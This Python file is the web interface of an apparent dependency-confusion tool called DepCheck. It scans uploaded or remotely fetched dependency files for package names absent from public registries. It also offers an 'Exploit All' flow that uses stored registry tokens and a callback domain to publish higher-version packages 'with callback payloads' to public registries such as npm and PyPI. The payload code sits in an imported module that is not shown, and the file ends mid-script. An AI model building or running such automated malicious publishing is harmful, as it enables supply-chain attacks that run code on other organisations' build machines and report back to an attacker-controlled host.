#!/usr/bin/env python3
"""
DepCheck Web UI — browser-based interface for scanning & exploitation.
Runs on Python stdlib only (http.server). Launch via: python3 depcheck.py --web
"""

import json
import os
import sys
import re
import uuid
import threading
from time import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
from tempfile import NamedTemporaryFile

# Import depcheck core
import depcheck as dc

# ─── In-Memory State ────────────────────────────────────────────────

scan_jobs = {}   # job_id → {status, results, ...}
scan_history = []  # last 20 scans

# ─── API Logic ──────────────────────────────────────────────────────

def run_scan(job_id, filepath, file_type=None, threads=20, timeout=10, display_name=""):
    """Run a scan in background thread."""
    job = scan_jobs[job_id]
    job["status"] = "running"

    try:
        ftype = file_type or dc.detect_file_type(filepath)
        if ftype == "unknown":
            job["status"] = "error"
            job["error"] = f"Unknown file type. Detected: {ftype}"
            return

        parser_func = dc.PARSERS.get(ftype)
        if not parser_func:
            job["status"] = "error"
            job["error"] = f"No parser for: {ftype}"
            return

        packages, ecosystem = parser_func(filepath)
        if not packages:
            job["status"] = "done"
            job["file_type"] = ftype
            job["ecosystem"] = ecosystem
            job["packages"] = {}
            job["results"] = {"vulnerable": [], "safe": [], "errors": []}
            return

        job["total"] = len(packages)
        job["ecosystem"] = ecosystem
        job["file_type"] = ftype
        job["packages"] = packages

        t0 = time()
        results = dc.scan_packages(packages, ecosystem, threads=threads, timeout=timeout, quiet=True)
        duration = time() - t0

        job["status"] = "done"
        job["results"] = results
        job["duration"] = round(duration, 1)
        job["display_name"] = display_name

        # Add to history
        entry = {
            "id": job_id,
            "file": display_name,
            "ecosystem": ecosystem,
            "total": len(packages),
            "vulnerable": len(results["vulnerable"]),
            "safe": len(results["safe"]),
            "errors": len(results["errors"]),
            "duration": round(duration, 1),
            "timestamp": int(time()),
        }
        scan_history.insert(0, entry)
        if len(scan_history) > 20:
            scan_history.pop()

    except Exception as e:
        job["status"] = "error"
        job["error"] = str(e)


def get_masked_creds():
    cfg = dc.load_config()
    masked = {}
    for k, v in cfg.items():
        if len(v) > 16:
            masked[k] = v[:6] + "..." + v[-4:]
        elif len(v) > 4:
            masked[k] = v[:3] + "..."
        else:
            masked[k] = "***"
    return masked


# ─── Web Handler ────────────────────────────────────────────────────

class WebHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        pass  # Suppress default logging

    def _send_json(self, data, status=200):
        body = json.dumps(data).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_html(self, html):
        body = html.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self):
        length = int(self.headers.get("Content-Length", 0))
        return self.rfile.read(length) if length else b""

    def do_GET(self):
        path = urlparse(self.path).path

        if path == "/" or path == "":
            self._send_html(HTML_PAGE)

        elif path == "/api/history":
            self._send_json(scan_history)

        elif path.startswith("/api/scan/"):
            job_id = path.split("/")[-1]
            job = scan_jobs.get(job_id)
            if not job:
                self._send_json({"error": "Job not found"}, 404)
                return
            resp = {"status": job["status"], "id": job_id}
            if job["status"] == "done":
                r = job["results"]
                resp.update({
                    "file_type": job.get("file_type", ""),
                    "ecosystem": job.get("ecosystem", ""),
                    "display_name": job.get("display_name", ""),
                    "total": len(job.get("packages", {})),
                    "vulnerable": sorted(r["vulnerable"]),
                    "safe": sorted(r["safe"]),
                    "errors": [{"name": n, "error": e} for n, e in r["errors"]],
                    "duration": job.get("duration", 0),
                    "packages": {k: v for k, v in job.get("packages", {}).items()},
                })
            elif job["status"] == "error":
                resp["error"] = job.get("error", "Unknown error")
            elif job["status"] == "running":
                resp["total"] = job.get("total", 0)
            self._send_json(resp)

        elif path == "/api/creds":
            self._send_json(get_masked_creds())

        elif path == "/api/info":
            self._send_json({
                "version": dc.VERSION,
                "ecosystems": list(dc.REGISTRIES.keys()),
                "exploiters": list(dc.EXPLOITERS.keys()),
                "parsers": list(dc.PARSERS.keys()),
            })

        else:
            self.send_error(404)

    def do_POST(self):
        path = urlparse(self.path).path

        if path == "/api/scan":
            content_type = self.headers.get("Content-Type", "")

            if "multipart/form-data" in content_type:
                # File upload
                boundary = content_type.split("boundary=")[-1].strip()
                body = self._read_body()
                parts = self._parse_multipart(body, boundary)

                file_data = parts.get("file", {})
                url = parts.get("url", "")
                file_type = parts.get("file_type", "")
                threads = int(parts.get("threads", "20"))
                timeout = int(parts.get("timeout", "10"))

                if url:
                    # URL scan
                    try:
                        tmp_path, url_name = dc.fetch_url(url, quiet=True)
                    except SystemExit:
                        self._send_json({"error": f"Failed to fetch URL: {url}"}, 400)
                        return
                    display_name = url
                    filepath = tmp_path
                elif file_data.get("content"):
                    tmp = NamedTemporaryFile(delete=False, suffix=f"_{file_data.get('filename', 'upload')}", prefix="depcheck_web_")
                    tmp.write(file_data["content"])
                    tmp.close()
                    filepath = tmp.name
                    display_name = file_data.get("filename", "upload")
                else:
                    self._send_json({"error": "No file or URL provided"}, 400)
                    return

                job_id = str(uuid.uuid4())[:8]
                scan_jobs[job_id] = {"status": "queued", "filepath": filepath}

                t = threading.Thread(target=run_scan, args=(job_id, filepath, file_type or None, threads, timeout, display_name))
                t.daemon = True
                t.start()

                self._send_json({"id": job_id, "status": "queued"})

            elif "application/json" in content_type:
                body = json.loads(self._read_body())
                url = body.get("url", "")
                file_type = body.get("file_type", "")
                threads = body.get("threads", 20)
                timeout = body.get("timeout", 10)

                if not url:
                    self._send_json({"error": "URL required"}, 400)
                    return

                try:
                    tmp_path, _ = dc.fetch_url(url, quiet=True)
                except SystemExit:
                    self._send_json({"error": f"Failed to fetch: {url}"}, 400)
                    return

                job_id = str(uuid.uuid4())[:8]
                scan_jobs[job_id] = {"status": "queued", "filepath": tmp_path}

                t = threading.Thread(target=run_scan, args=(job_id, tmp_path, file_type or None, threads, timeout, url))
                t.daemon = True
                t.start()

                self._send_json({"id": job_id, "status": "queued"})
            else:
                self._send_json({"error": "Invalid content type"}, 400)

        elif path == "/api/creds":
            body = json.loads(self._read_body())
            for k, v in body.items():
                dc.set_cred(k, v)
            self._send_json({"ok": True, "saved": list(body.keys())})

        elif path == "/api/exploit":
            body = json.loads(self._read_body())
            job_id = body.get("scan_id", "")
            job = scan_jobs.get(job_id)
            if not job or job["status"] != "done":
                self._send_json({"error": "Scan job not found or not complete"}, 400)
                return

            ecosystem = job.get("ecosystem", "")
            vulnerable = job["results"].get("vulnerable", [])
            callback = body.get("callback") or dc.get_cred("callback")
            token_map = {
                "npm": "npm_token", "pip": "pypi_token", "rubygems": "rubygems_token",
                "nuget": "nuget_token", "cargo": "cargo_token",
                "composer": "github_token", "go": "github_token", "maven": "github_token",
            }
            token_key = token_map.get(ecosystem, f"{ecosystem}_token")
            token = body.get("token") or dc.get_cred(token_key)
            author = body.get("author") or dc.get_cred("author") or "security-research"

            if not vulnerable:
                self._send_json({"error": "No vulnerable packages to exploit"}, 400)
                return
            if not callback:
                self._send_json({"error": "Callback domain required"}, 400)
                return
            if not token:
                self._send_json({"error": f"Token required ({token_key})"}, 400)
                return

            # Run exploit in background
            exploit_id = str(uuid.uuid4())[:8]
            scan_jobs[exploit_id] = {"status": "exploiting", "ecosystem": ecosystem, "packages": vulnerable}

            def do_exploit():
                count = dc.exploit_packages(vulnerable, ecosystem, callback, token, author)
                scan_jobs[exploit_id]["status"] = "done"
                scan_jobs[exploit_id]["success_count"] = count
                scan_jobs[exploit_id]["total"] = len(vulnerable)

            t = threading.Thread(target=do_exploit)
            t.daemon = True
            t.start()

            self._send_json({"id": exploit_id, "status": "exploiting", "targets": len(vulnerable)})

        else:
            self.send_error(404)

    def do_DELETE(self):
        path = urlparse(self.path).path

        if path == "/api/creds":
            if os.path.exists(dc.CONFIG_FILE):
                os.unlink(dc.CONFIG_FILE)
            self._send_json({"ok": True, "message": "All credentials cleared"})

        elif path.startswith("/api/creds/"):
            key = path.split("/")[-1]
            dc.delete_cred(key)
            self._send_json({"ok": True, "deleted": key})

        else:
            self.send_error(404)

    def _parse_multipart(self, body, boundary):
        """Parse multipart/form-data."""
        parts = {}
        boundary_bytes = f"--{boundary}".encode()
        segments = body.split(boundary_bytes)

        for seg in segments:
            if not seg or seg == b"--\r\n" or seg == b"--":
                continue
            if b"\r\n\r\n" not in seg:
                continue
            header_part, content = seg.split(b"\r\n\r\n", 1)
            if content.endswith(b"\r\n"):
                content = content[:-2]

            header_str = header_part.decode("utf-8", errors="ignore")
            name_match = re.search(r'name="([^"]+)"', header_str)
            if not name_match:
                continue
            name = name_match.group(1)

            filename_match = re.search(r'filename="([^"]*)"', header_str)
            if filename_match:
                parts[name] = {"filename": filename_match.group(1), "content": content}
            else:
                parts[name] = content.decode("utf-8", errors="ignore").strip()

        return parts


# ─── HTML Page ──────────────────────────────────────────────────────

HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DepCheck — Dependency Confusion Scanner</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#e6edf3;--muted:#8b949e;--accent:#58a6ff;--red:#f85149;--green:#3fb950;--yellow:#d29922;--hover:#1f2937}
body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;min-height:100vh}
a{color:var(--accent);text-decoration:none}

/* Header */
.header{background:var(--card);border-bottom:1px solid var(--border);padding:16px 24px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
.logo{font-size:22px;font-weight:700;color:var(--red);letter-spacing:-0.5px}
.logo span{color:var(--accent);font-weight:400;font-size:14px;margin-left:8px}
.nav{display:flex;gap:4px}
.nav-btn{background:none;border:1px solid transparent;color:var(--muted);padding:8px 20px;border-radius:6px;cursor:pointer;font-size:14px;font-weight:500;transition:all .15s}
.nav-btn:hover{color:var(--text);background:var(--hover)}
.nav-btn.active{color:var(--accent);border-color:var(--accent);background:rgba(88,166,255,.08)}

/* Main */
.main{max-width:1100px;margin:0 auto;padding:24px}
.page{display:none}
.page.active{display:block}

/* Cards */
.card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:24px;margin-bottom:16px}
.card h2{font-size:16px;margin-bottom:16px;color:var(--text)}
.card h3{font-size:14px;margin-bottom:12px;color:var(--muted)}

/* Form elements */
input[type="text"],input[type="number"],input[type="password"],select{background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:6px;font-size:14px;width:100%;outline:none;transition:border .15s}
input:focus,select:focus{border-color:var(--accent)}
label{font-size:13px;color:var(--muted);display:block;margin-bottom:6px}
.form-row{margin-bottom:16px}
.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}

/* Buttons */
.btn{padding:10px 24px;border-radius:6px;border:none;font-size:14px;font-weight:600;cursor:pointer;transition:all .15s;display:inline-flex;align-items:center;gap:8px}
.btn-primary{background:var(--accent);color:#fff}
.btn-primary:hover{background:#4c94e0}
.btn-danger{background:var(--red);color:#fff}
.btn-danger:hover{background:#e0443d}
.btn-ghost{background:transparent;border:1px solid var(--border);color:var(--text)}
.btn-ghost:hover{background:var(--hover)}
.btn-sm{padding:6px 14px;font-size:13px}
.btn:disabled{opacity:.5;cursor:not-allowed}

/* Upload zone */
.upload-zone{border:2px dashed var(--border);border-radius:8px;padding:48px;text-align:center;cursor:pointer;transition:all .2s}
.upload-zone:hover,.upload-zone.dragover{border-color:var(--accent);background:rgba(88,166,255,.04)}
.upload-zone .icon{font-size:48px;margin-bottom:12px;opacity:.5}
.upload-zone p{color:var(--muted);font-size:14px}
.upload-zone .filename{color:var(--green);font-weight:600;margin-top:8px}
.or-divider{text-align:center;color:var(--muted);font-size:13px;margin:16px 0;position:relative}
.or-divider::before,.or-divider::after{content:'';position:absolute;top:50%;width:calc(50% - 30px);height:1px;background:var(--border)}
.or-divider::before{left:0}
.or-divider::after{right:0}

/* Stats */
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:20px}
.stat{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:16px;text-align:center}
.stat .value{font-size:28px;font-weight:700;line-height:1.2}
.stat .label{font-size:12px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:.5px}
.stat.vuln .value{color:var(--red)}
.stat.safe .value{color:var(--green)}
.stat.total .value{color:var(--accent)}

/* Tables */
.pkg-table{width:100%;border-collapse:collapse;font-size:14px}
.pkg-table th{text-align:left;padding:10px 12px;border-bottom:1px solid var(--border);color:var(--muted);font-weight:500;font-size:12px;text-transform:uppercase;letter-spacing:.5px}
.pkg-table td{padding:10px 12px;border-bottom:1px solid rgba(48,54,61,.5)}
.pkg-table tr:hover td{background:var(--hover)}
.pkg-table .vuln{color:var(--red)}
.pkg-table .safe{color:var(--green)}
.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:11px;font-weight:600}
.badge-red{background:rgba(248,81,73,.15);color:var(--red)}
.badge-green{background:rgba(63,185,80,.15);color:var(--green)}

/* Credential items */
.cred-item{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;border:1px solid var(--border);border-radius:6px;margin-bottom:8px;background:var(--bg)}
.cred-item .key{font-weight:600;color:var(--accent);min-width:140px}
.cred-item .val{color:var(--muted);font-family:monospace;flex:1;margin:0 16px}
.cred-item .del-btn{background:none;border:none;color:var(--red);cursor:pointer;font-size:18px;padding:4px 8px;border-radius:4px}
.cred-item .del-btn:hover{background:rgba(248,81,73,.1)}

/* Spinner */
.spinner{display:inline-block;width:20px;height:20px;border:3px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .6s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}

/* Progress */
.progress-bar{width:100%;height:6px;background:var(--border);border-radius:3px;overflow:hidden;margin:12px 0}
.progress-fill{height:100%;background:var(--accent);border-radius:3px;transition:width .3s}

/* Toast */
.toast{position:fixed;bottom:24px;right:24px;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:14px 20px;font-size:14px;box-shadow:0 8px 24px rgba(0,0,0,.4);z-index:200;transform:translateY(80px);opacity:0;transition:all .3s}
.toast.show{transform:translateY(0);opacity:1}
.toast.success{border-color:var(--green)}
.toast.error{border-color:var(--red)}

/* Exploit log */
.exploit-log{background:var(--bg);border:1px solid var(--border);border-radius:6px;padding:16px;font-family:monospace;font-size:13px;max-height:400px;overflow-y:auto;white-space:pre-wrap;line-height:1.6}

/* Collapsible */
.collapsible-header{cursor:pointer;display:flex;align-items:center;gap:8px;user-select:none}
.collapsible-header::before{content:'\\25B6';font-size:10px;transition:transform .2s}
.collapsible-header.open::before{transform:rotate(90deg)}
.collapsible-body{display:none;margin-top:12px}
.collapsible-body.open{display:block}

/* Empty state */
.empty{text-align:center;padding:48px;color:var(--muted)}
.empty .icon{font-size:48px;margin-bottom:12px;opacity:.3}

/* Responsive */
@media(max-width:700px){
  .form-grid{grid-template-columns:1fr}
  .stats{grid-template-columns:1fr 1fr}
  .header{flex-direction:column;gap:12px}
  .main{padding:16px}
}
</style>
</head>
<body>

<div class="header">
  <div class="logo">DepCheck <span>v""" + dc.VERSION + """ — Web UI</span></div>
  <div class="nav">
    <button class="nav-btn active" onclick="showPage('scan')">Scan</button>
    <button class="nav-btn" onclick="showPage('results')">Results</button>
    <button class="nav-btn" onclick="showPage('settings')">Settings</button>
  </div>
</div>

<div class="main">

  <!-- ═══ SCAN PAGE ═══ -->
  <div id="page-scan" class="page active">

    <div class="card">
      <h2>Scan Dependency File</h2>

      <div class="upload-zone" id="dropzone" onclick="document.getElementById('fileInput').click()">
        <div class="icon">&#128196;</div>
        <p>Drag & drop a dependency file here, or <strong>click to browse</strong></p>
        <p style="font-size:12px;margin-top:8px;color:var(--muted)">
          package.json, package-lock.json, yarn.lock, requirements.txt, composer.json, Gemfile, pom.xml, go.mod, Cargo.toml, etc.
        </p>
        <div class="filename" id="fileName"></div>
      </div>
      <input type="file" id="fileInput" style="display:none" onchange="handleFile(this.files[0])">

      <div class="or-divider">OR</div>

      <div class="form-row">
        <label>Scan from URL</label>
        <input type="text" id="urlInput" placeholder="https://target.com/package-lock.json">
      </div>

      <div class="form-grid">
        <div class="form-row">
          <label>File Type (auto-detect)</label>
          <select id="fileType">
            <option value="">Auto-detect</option>
          </select>
        </div>
        <div class="form-row">
          <label>Threads</label>
          <input type="number" id="threads" value="20" min="1" max="100">
        </div>
      </div>

      <button class="btn btn-primary" id="scanBtn" onclick="startScan()">
        Scan
      </button>
    </div>

    <!-- Scan Status -->
    <div class="card" id="scanStatus" style="display:none">
      <div style="display:flex;align-items:center;gap:12px">
        <div class="spinner"></div>
        <div>
          <div id="scanStatusText">Scanning...</div>
          <div class="progress-bar"><div class="progress-fill" id="scanProgress" style="width:0%"></div></div>
        </div>
      </div>
    </div>

    <!-- Recent Scans -->
    <div class="card">
      <h2>Recent Scans</h2>
      <div id="historyList"><div class="empty"><div class="icon">&#128269;</div><p>No scans yet</p></div></div>
    </div>
  </div>

  <!-- ═══ RESULTS PAGE ═══ -->
  <div id="page-results" class="page">
    <div id="noResults"><div class="empty" style="padding:80px"><div class="icon">&#128202;</div><p>Run a scan first to see results</p></div></div>
    <div id="resultsContent" style="display:none">
      <div class="stats" id="statsCards"></div>

      <div class="card">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
          <h2 id="resultsTitle">Vulnerable Packages</h2>
          <div style="display:flex;gap:8px">
            <button class="btn btn-ghost btn-sm" onclick="exportResults()">Export JSON</button>
            <button class="btn btn-danger btn-sm" id="exploitBtn" onclick="showPage('exploit')" style="display:none">Exploit All</button>
          </div>
        </div>
        <div id="vulnTable"></div>
      </div>

      <div class="card">
        <div class="collapsible-header" onclick="toggleCollapse(this)">
          <h3 id="safeTitle">Safe Packages</h3>
        </div>
        <div class="collapsible-body" id="safeTable"></div>
      </div>
    </div>
  </div>

  <!-- ═══ EXPLOIT PAGE ═══ -->
  <div id="page-exploit" class="page">
    <div class="card">
      <h2>Exploit Vulnerable Packages</h2>
      <p style="color:var(--muted);margin-bottom:16px;font-size:14px">
        Publish higher-version packages with callback payloads to the public registry.
      </p>

      <div class="form-grid">
        <div class="form-row">
          <label>Callback Domain</label>
          <input type="text" id="exploitCallback" placeholder="your.burp.net">
        </div>
        <div class="form-row">
          <label>Author</label>
          <input type="text" id="exploitAuthor" placeholder="security-research">
        </div>
      </div>

      <div class="form-row">
        <label id="tokenLabel">Token</label>
        <input type="password" id="exploitToken" placeholder="Token for the detected ecosystem">
      </div>

      <div style="margin-bottom:16px">
        <label>Targets (<span id="exploitCount">0</span> vulnerable)</label>
        <div id="exploitTargets" style="max-height:200px;overflow-y:auto;margin-top:8px"></div>
      </div>

      <button class="btn btn-danger" id="doExploitBtn" onclick="startExploit()">
        Publish Exploit Packages
      </button>

      <div class="exploit-log" id="exploitLog" style="display:none;margin-top:16px"></div>
    </div>
  </div>

  <!-- ═══ SETTINGS PAGE ═══ -->
  <div id="page-settings" class="page">
    <div class="card">
      <h2>Saved Credentials</h2>
      <p style="color:var(--muted);margin-bottom:16px;font-size:14px">
        Credentials stored in <code style="background:var(--bg);padding:2px 6px;border-radius:4px">~/.depcheck/config.json</code> (0600 permissions)
      </p>
      <div id="credsList"></div>
      <button class="btn btn-danger btn-sm" onclick="clearAllCreds()" style="margin-top:12px">Clear All</button>
    </div>

    <div class="card">
      <h2>Add / Update Credential</h2>
      <div class="form-grid">
        <div class="form-row">
          <label>Key</label>
          <select id="credKey">
            <option value="npm_token">npm_token</option>
            <option value="pypi_token">pypi_token</option>
            <option value="rubygems_token">rubygems_token</option>
            <option value="cargo_token">cargo_token</option>
            <option value="nuget_token">nuget_token</option>
            <option value="github_token">github_token</option>
            <option value="packagist_token">packagist_token</option>
            <option value="callback">callback</option>
            <option value="author">author</option>
          </select>
        </div>
        <div class="form-row">
          <label>Value</label>
          <input type="text" id="credValue" placeholder="Token or value...">
        </div>
      </div>
      <button class="btn btn-primary btn-sm" onclick="saveCred()">Save</button>
    </div>

    <div class="card">
      <h2>Server Info</h2>
      <div style="font-size:14px;color:var(--muted);line-height:2">
        <div>Version: <strong style="color:var(--text)">DepCheck v""" + dc.VERSION + """</strong></div>
        <div>Parsers: <strong style="color:var(--text)" id="parserCount">0</strong> file formats</div>
        <div>Exploiters: <strong style="color:var(--text)" id="exploiterList">-</strong></div>
      </div>
    </div>
  </div>

</div>

<div class="toast" id="toast"></div>

<script>
let currentScanId = null;
let currentResults = null;
let selectedFile = null;

// ── Navigation ──
function showPage(name) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
  document.getElementById('page-' + name).classList.add('active');
  document.querySelector(`.nav-btn[onclick="showPage('${name}')"]`).classList.add('active');
}

// ── Toast ──
function toast(msg, type='success') {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.className = 'toast ' + type + ' show';
  setTimeout(() => t.classList.remove('show'), 3000);
}

// ── File Upload ──
const dz = document.getElementById('dropzone');
dz.addEventListener('dragover', e => { e.preventDefault(); dz.classList.add('dragover'); });
dz.addEventListener('dragleave', () => dz.classList.remove('dragover'));
dz.addEventListener('drop', e => {
  e.preventDefault(); dz.classList.remove('dragover');
  if (e.dataTransfer.files.length) handleFile(e.dataTransfer.files[0]);
});

function handleFile(file) {
  if (!file) return;
  selectedFile = file;
  document.getElementById('fileName').textContent = file.name + ' (' + (file.size/1024).toFixed(1) + ' KB)';
  document.getElementById('urlInput').value = '';
}

// ── Scan ──
function startScan() {
  const url = document.getElementById('urlInput').value.trim();
  const fileType = document.getElementById('fileType').value;
  const threads = document.getElementById('threads').value;

  if (!selectedFile && !url) {
    toast('Upload a file or enter a URL', 'error');
    return;
  }

  const fd = new FormData();
  if (selectedFile) fd.append('file', selectedFile);
  if (url) fd.append('url', url);
  if (fileType) fd.append('file_type', fileType);
  fd.append('threads', threads);
  fd.append('timeout', '10');

  document.getElementById('scanBtn').disabled = true;
  document.getElementById('scanStatus').style.display = 'block';
  document.getElementById('scanStatusText').textContent = 'Starting scan...';
  document.getElementById('scanProgress').style.width = '10%';

  fetch('/api/scan', { method: 'POST', body: fd })
    .then(r => r.json())
    .then(data => {
      if (data.error) {
        toast(data.error, 'error');
        document.getElementById('scanBtn').disabled = false;
        document.getElementById('scanStatus').style.display = 'none';
        return;
      }
      currentScanId = data.id;
      pollScan(data.id);
    })
    .catch(e => {
      toast('Scan failed: ' + e, 'error');
      document.getElementById('scanBtn').disabled = false;
      document.getElementById('scanStatus').style.display = 'none';
    });
}

function pollScan(id) {
  fetch('/api/scan/' + id)
    .then(r => r.json())
    .then(data => {
      if (data.status === 'done') {
        document.getElementById('scanBtn').disabled = false;
        document.getElementById('scanStatus').style.display = 'none';
        document.getElementById('scanProgress').style.width = '100%';
        currentResults = data;
        showResults(data);
        showPage('results');
        loadHistory();
        toast('Scan complete: ' + data.vulnerable.length + ' vulnerable');
      } else if (data.status === 'error') {
        document.getElementById('scanBtn').disabled = false;
        document.getElementById('scanStatus').style.display = 'none';
        toast(data.error || 'Scan failed', 'error');
      } else {
        // Still running
        const pct = data.total > 0 ? Math.min(90, 10 + Math.random() * 30) : 30;
        document.getElementById('scanProgress').style.width = pct + '%';
        document.getElementById('scanStatusText').textContent = 'Scanning ' + (data.total || '?') + ' packages...';
        setTimeout(() => pollScan(id), 1000);
      }
    })
    .catch(() => setTimeout(() => pollScan(id), 2000));
}

// ── Results ──
function showResults(data) {
  document.getElementById('noResults').style.display = 'none';
  document.getElementById('resultsContent').style.display = 'block';

  // Stats
  const stats = document.getElementById('statsCards');
  stats.innerHTML = `
    <div class="stat total"><div class="value">${data.total}</div><div class="label">Total</div></div>
    <div class="stat safe"><div class="value">${data.safe.length}</div><div class="label">Safe</div></div>
    <div class="stat vuln"><div class="value">${data.vulnerable.length}</div><div class="label">Vulnerable</div></div>
    <div class="stat"><div class="value" style="font-size:20px">${data.ecosystem}</div><div class="label">Ecosystem</div></div>
    <div class="stat"><div class="value">${data.duration}s</div><div class="label">Duration</div></div>
  `;

  // Vulnerable table
  const vt = document.getElementById('vulnTable');
  if (data.vulnerable.length === 0) {
    vt.innerHTML = '<div style="padding:24px;text-align:center;color:var(--green);font-weight:600">All packages exist on the public registry. No dependency confusion found.</div>';
    document.getElementById('resultsTitle').textContent = 'All Safe';
    document.getElementById('exploitBtn').style.display = 'none';
  } else {
    document.getElementById('resultsTitle').textContent = data.vulnerable.length + ' Vulnerable Packages';
    document.getElementById('exploitBtn').style.display = 'inline-flex';
    let html = '<table class="pkg-table"><thead><tr><th>Package</th><th>Version</th><th>Status</th></tr></thead><tbody>';
    data.vulnerable.forEach(name => {
      const ver = data.packages[name] || '?';
      html += `<tr><td class="vuln"><strong>${esc(name)}</strong></td><td>${esc(ver)}</td><td><span class="badge badge-red">NOT FOUND</span></td></tr>`;
    });
    html += '</tbody></table>';
    vt.innerHTML = html;
  }

  // Safe table
  document.getElementById('safeTitle').textContent = `Safe Packages (${data.safe.length})`;
  const st = document.getElementById('safeTable');
  if (data.safe.length > 0) {
    let html = '<table class="pkg-table"><thead><tr><th>Package</th><th>Version</th><th>Status</th></tr></thead><tbody>';
    data.safe.forEach(name => {
      const ver = data.packages[name] || '?';
      html += `<tr><td class="safe">${esc(name)}</td><td>${esc(ver)}</td><td><span class="badge badge-green">EXISTS</span></td></tr>`;
    });
    html += '</tbody></table>';
    st.innerHTML = html;
  }

  // Setup exploit page
  setupExploit(data);
}

function toggleCollapse(el) {
  el.classList.toggle('open');
  el.nextElementSibling.classList.toggle('open');
}

function exportResults() {
  if (!currentResults) return;
  const blob = new Blob([JSON.stringify(currentResults, null, 2)], {type: 'application/json'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'depcheck-results.json';
  a.click();
}

function esc(s) {
  const d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}

// ── Exploit ──
function setupExploit(data) {
  const eco = data.ecosystem;
  const tokenMap = {npm:'npm_token',pip:'pypi_token',rubygems:'rubygems_token',nuget:'nuget_token',cargo:'cargo_token',composer:'github_token',go:'github_token',maven:'github_token'};
  document.getElementById('tokenLabel').textContent = 'Token (' + (tokenMap[eco] || eco + '_token') + ')';
  document.getElementById('exploitCount').textContent = data.vulnerable.length;

  // Load saved creds
  fetch('/api/creds').then(r=>r.json()).then(creds => {
    if (creds.callback) document.getElementById('exploitCallback').placeholder = 'Saved: ' + creds.callback;
    if (creds.author) document.getElementById('exploitAuthor').placeholder = 'Saved: ' + creds.author;
  });

  let html = '';
  data.vulnerable.forEach(name => {
    html += `<div class="cred-item"><label style="display:flex;align-items:center;gap:8px;cursor:pointer"><input type="checkbox" class="exploit-target" value="${esc(name)}" checked> <span>${esc(name)}</span></label></div>`;
  });
  document.getElementById('exploitTargets').innerHTML = html || '<div style="color:var(--muted)">No vulnerable packages</div>';
}

function startExploit() {
  if (!currentResults || !currentScanId) { toast('Run a scan first', 'error'); return; }

  const callback = document.getElementById('exploitCallback').value.trim();
  const token = document.getElementById('exploitToken').value.trim();
  const author = document.getElementById('exploitAuthor').value.trim();

  const body = { scan_id: currentScanId };
  if (callback) body.callback = callback;
  if (token) body.token = token;
  if (author) body.author = author;

  document.getElementById('doExploitBtn').disabled = true;
  document.getElementById('exploitLog').style.display = 'block';
  document.getElementById('exploitLog').textContent = 'Starting exploitation...\\n';

  fetch('/api/exploit', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(body) })
    .then(r => r.json())
    .then(data => {
      if (data.error) {
        toast(data.error, 'error');
        document.getElementById('doExploitBtn').disabled = false;
        document.getElementById('exploitLog').textContent += 'ERROR: ' + data.error + '\\n';
        return;
      }
      document.getElementById('exploitLog').textContent += 'Exploiting ' + data.targets + ' packages...\\n';
      pollExploit(data.id);
    })
    .catch(e => {
      toast('Exploit failed: ' + e, 'error');
      document.getElementById('doExploitBtn').disabled = false;
    });
}

function pollExploit(id) {
  fetch('/api/scan/' + id)
    .then(r => r.json())
    .then(data => {
      if (data.status === 'done') {
        document.getElementById('doExploitBtn').disabled = false;
        const log = document.getElementById('exploitLog');
        log.textContent += '\\nDone! Published: ' + (data.success_count || 0) + '/' + (data.total || '?') + '\\n';
        toast('Exploitation complete: ' + (data.success_count || 0) + ' published');
      } else if (data.status === 'error') {
        document.getElementById('doExploitBtn').disabled = false;
        toast(data.error || 'Exploit failed', 'error');
      } else {
        document.getElementById('exploitLog').textContent += '.';
        setTimeout(() => pollExploit(id), 2000);
      }
    })
    .catch(() => setTimeout(() => pollExploit(id), 3000));
}

// ── Credentials ──
function loadCreds() {
  fetch('/api/creds')
    .then(r => r.json())
    .then(creds => {
      const el = document.getElementById('credsList');
      const keys = Object.keys(creds);
      if (keys.length === 0) {
        el.innerHTML = '<div style="color:var(--muted);padding:12px">No saved credentials. Add one below.</div>';
        return;
      }
      el.innerHTML = keys.map(k =>
        `<div class="cred-item">
          <span class="key">${esc(k)}</span>
          <span class="val">${esc(creds[k])}</span>
          <button class="del-btn" onclick="deleteCred('${k}')" title="Delete">&#10005;</button>
        </div>`
      ).join('');
    });
}

function saveCred() {
  const key = document.getElementById('credKey').value;
  const val = document.getElementById('credValue').value.trim();
  if (!val) { toast('Enter a value', 'error'); return; }
  fetch('/api/creds', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({[key]: val}) })
    .then(r => r.json())
    .then(() => { toast('Saved: ' + key); document.getElementById('credValue').value = ''; loadCreds(); });
}

